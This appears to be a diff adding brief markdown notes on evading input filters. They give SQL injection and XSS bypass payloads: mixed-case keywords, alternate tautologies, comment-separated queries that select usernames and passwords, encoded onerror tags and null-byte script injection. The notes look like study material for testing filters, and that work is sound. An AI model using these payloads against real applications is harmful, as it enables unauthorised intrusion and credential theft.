@@ -1,0 +1,14 @@
+### Reject Known Bad
+*  If SELECT is blocked, try SeLeCt
+*  If or 1=1-- is blocked, try or 2=2--
+*  If alert(‘xss’) is blocked, try prompt(‘xss’)
+
+### filters designed to block specific keywords can be bypassed by using nonstandard characters between expressions
+* SELECT/*foo*/username,password/*foo*/FROM/*foo*/users
+* <img%09onerror=alert(1) src=a>
+
+### Using NULL Byte to bypass filter
+* %00<script>alert(1)</script>
+
+### WhiteListing: data that matches the whitelist and blocks everything else
+
